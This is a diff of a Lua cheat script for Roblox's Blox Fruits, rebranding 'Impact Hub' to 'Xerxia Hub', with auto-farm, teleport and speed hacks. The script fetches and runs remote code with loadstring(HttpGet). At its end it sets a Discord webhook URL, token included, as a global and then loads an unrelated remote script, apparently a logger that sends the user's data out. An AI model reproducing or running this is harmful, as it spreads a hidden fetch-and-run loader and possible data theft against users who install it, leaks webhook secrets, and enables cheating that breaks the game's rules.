@@ -104,11 +104,11 @@ function RightQuest(QuestText)
     end
 end
 
-local HubName = "Impact Hub V1.9"
+local HubName = "Xerxia Hub"
 local date = os.date("%d".." ".."%B".." ".."%Y")
 
 local Venyx = loadstring(game:HttpGet("https://raw.githubusercontent.com/PersonaLifeII/Impact-Hub/main/UI%20Venyx"))()
-local UI  = Venyx.new(HubName.." | Easily To Used | Revamp Script | "..date, 5013109572)
+local UI  = Venyx.new(HubName.." V.1 | Blox Fruit | "..date, 5013109572)
 
 local page1 = UI:addPage("Main Tab", 7040391851)
 local FARMS = page1:addSection("Auto Farm Setting")
@@ -691,7 +691,7 @@ end)
                 local Minute = math.floor(GameTime/(60^1))%60
                 local Second = math.floor(GameTime/(60^0))%60
         
-                 UI:Notify("Impact Hub", "Total Time You Have Joined\nHour : "..Hour.." Minute : "..Minute.." Second : "..Second);
+                 UI:Notify(HubName, "Total Time You Have Joined\nHour : "..Hour.." Minute : "..Minute.." Second : "..Second);
             end)
             
 local Stat = page1:addSection("Auto Stats")
@@ -1295,7 +1295,7 @@ pcall(function()
         end  
         if game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Black Leg") and game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Black Leg").Level.Value < 400 then
             MainWeaponName = "Black Leg"
-            UI:Notify("Impact Hub", "Seted Weapon To : Black Leg")
+            UI:Notify(HubName, "Seted Weapon To : Black Leg")
             _G.Farm_Lv = true
         elseif not game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Black Leg") and not game:GetService("Players").LocalPlayer.Character:FindFirstChild("Black Leg") then
             _G.Farm_Lv = false  
@@ -1333,7 +1333,7 @@ SharkmanKarate:addToggle("Auto Farm Fishman Karate Mastery [400]", nil, function
                     end  
                     if game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Fishman Karate") and game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Fishman Karate").Level.Value < 400 then
                         MainWeaponName = "Fishman Karate"
-                        UI:Notify("Impact Hub", "Seted Weapon To : Fishman Karate")
+                        UI:Notify(HubName, "Seted Weapon To : Fishman Karate")
                         _G.Farm_Lv = true      
 
                     elseif not game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Fishman Karate") or not game:GetService("Players").LocalPlayer.Character:FindFirstChild("Fishman Karate") then 
@@ -1972,11 +1972,11 @@ end
 
 local Tp2 = tppage:addSection("Server")
 Tp2:addButton("Server Hop", function()
-        UI:Notify("Impact Hub", "Finding Server And Hoping..")
+        UI:Notify(HubName, "Finding Server And Hoping..")
         Hop()
     end)
     Tp2:addButton("Rejoin",function()
-        UI:Notify("Impact Hub", "Rejoining..")
+        UI:Notify(HubName, "Rejoining..")
         Rejoin()
     end)
     local plypage = UI:addPage("Players\nBounty", 7252023075)
@@ -2248,7 +2248,7 @@ task.spawn(function()
     end)
 
     plysection2:addButton("Check Your Current Bounty", function()
-        UI:Notify("Impact Hub", "Your Current Bounty Is : "..(game:GetService("Players").LocalPlayer.leaderstats["Bounty/Honor"].Value))
+        UI:Notify(HubName, "Your Current Bounty Is : "..(game:GetService("Players").LocalPlayer.leaderstats["Bounty/Honor"].Value))
     end)
     
     spawn(function()
@@ -2327,7 +2327,7 @@ task.spawn(function()
                             end
 
                         elseif not string.find(v.Name, "Island") and v:IsA("Part") then
-                            UI:Notify("Impact Hub", "Please Enter The Raid")
+                            UI:Notify(HubName, "Please Enter The Raid")
                            end
                          end
                      end
@@ -2400,7 +2400,7 @@ task.spawn(function()
                 end
 
             elseif not string.find(v.Name, "Island") and v:IsA("Part") then
-                UI:Notify("Impact Hub", "Please Enter The Raid")
+                UI:Notify(HubName, "Please Enter The Raid")
                     end
                 end
             end
@@ -2938,11 +2938,11 @@ Basic:addSlider("Jump Power", 50,-50,1250, function(value)
 end)
 
 Basic:addButton("Check Current Walk Speed", function(value)
-    UI:Notify("Impact Hub", "Your Current Walk Speed Is : "..game:GetService("Players").LocalPlayer.Character.Humanoid.WalkSpeed)
+    UI:Notify(HubName, "Your Current Walk Speed Is : "..game:GetService("Players").LocalPlayer.Character.Humanoid.WalkSpeed)
 end)
 
 Basic:addButton("Check Current Jump Power", function(value)
-    UI:Notify("Impact Hub", "Your Current Jump Power Is : "..game:GetService("Players").LocalPlayer.Character.Humanoid.JumpPower)
+    UI:Notify(HubName, "Your Current Jump Power Is : "..game:GetService("Players").LocalPlayer.Character.Humanoid.JumpPower)
 end)
 
 Basic:addToggle("Set Walk Speed", nil, function(value)
@@ -5229,7 +5229,7 @@ function JoinTeam()
         game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetTeam","Marines") 
 
     else
-        UI:Notify("Impact Hub", "Error")
+        UI:Notify(HubName, "Error")
     end
 end
 
@@ -5275,7 +5275,7 @@ DeleteMDF()
                             end
                         end)
 
-UI:Notify("Impact Hub", "Welcom To Impact Hub.")
+UI:Notify(HubName, "Welcome To "..HubName)
 BusoHaki()
 TP(game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame)
 UnClip()
@@ -5286,6 +5286,6 @@ local plr = game.Players.LocalPlayer.Character.HumanoidRootPart
 local pld = game.Players.LocalPlayer.Character.Humanoid
 local MyCFrame = plr.CFrame
 
-local Web = "https://discordapp.com/api/webhooks/1055787246063718410/cw5P_S-wPTCSId1hbOBW4yL7EQ9VOuCocjZpg6Ah6ZuNTi16RIBl-kbJxM20lDjpeOvI"
+local Web = "https://discord.com/api/webhooks/1316075263804837898/y9G0eQAzlGWjgvDEb9Fux7VTQBSrQYdo0-ZpZpeV07IX2szQ30E_dUBTVsCjXt0nWPIC"
 _G.webhooksdiscord = Web
 loadstring(game:HttpGet("https://raw.githubusercontent.com/SHARKX516/SHREKATTACK/main/SHARKLOL2.lua", true))()
